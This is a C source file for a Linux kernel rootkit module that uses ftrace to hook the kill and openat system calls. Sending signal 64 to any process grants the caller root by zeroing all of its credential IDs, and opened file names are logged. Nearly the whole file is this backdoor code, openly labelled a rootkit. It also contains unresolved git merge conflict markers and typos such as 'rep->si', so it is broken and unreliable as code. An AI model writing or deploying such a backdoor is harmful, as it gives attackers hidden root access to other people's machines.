#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>

#include "ftrace_helper.h"

MODULE_LICENSE("");
MODULE_AUTHOR("");
MODULE_DESCRIPTION("");
MODULE_VERSION("");

<<<<<<< HEAD
asmlinkage int hook_open(const struct pt_regs *regs)
{
    char *filename = (char *)rep->si;
    printk(KERN_INFO, "rootkit: obrint el següent fitxer %s ...", filename);
    return orig_open(regs);
}
/*
=======

>>>>>>> 0d21cc693e55fbd20a3559630104c43a6a1f6eea
asmlinkage int hook_kill(const struct pt_regs *regs)
{
    void set_root(void);

    // pid_t pid = regs->di;
    int sig = regs->si;

<<<<<<< HEAD
    if (sig == 64)
=======
    if ( sig == 64 )
>>>>>>> 0d21cc693e55fbd20a3559630104c43a6a1f6eea
    {
        printk(KERN_INFO "rootkit: giving root...\n");
        set_root();
        return 0;
    }

    return orig_kill(regs);

<<<<<<< HEAD
*/
=======
}
>>>>>>> 0d21cc693e55fbd20a3559630104c43a6a1f6eea
void set_root(void)
{
    /* prepare_creds returns the current credentials of the process */
    struct cred *root;
    root = prepare_creds();

    if (root == NULL)
        return;

    /* Run through and set all the various *id's to 0 (root) */
    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    /* Set the cred struct that we've modified to that of the calling process */
    commit_creds(root);
}

/* Declare the struct that ftrace needs to hook the syscall */
static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
<<<<<<< HEAD
    HOOK("__x64_sys_openat", hook_open, &orig_open),

=======
>>>>>>> 0d21cc693e55fbd20a3559630104c43a6a1f6eea
};

/* Module initialization function */
static int __init rootkit_init(void)
{
    /* Hook the syscall and print to the kernel buffer */
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
<<<<<<< HEAD
    if (err)
=======
    if(err)
>>>>>>> 0d21cc693e55fbd20a3559630104c43a6a1f6eea
        return err;

    printk(KERN_INFO "rootkit: Loaded >:-)\n");

    return 0;
}

static void __exit rootkit_exit(void)
{
    /* Unhook and restore the syscall and print to the kernel buffer */
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "rootkit: Unloaded :-(\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
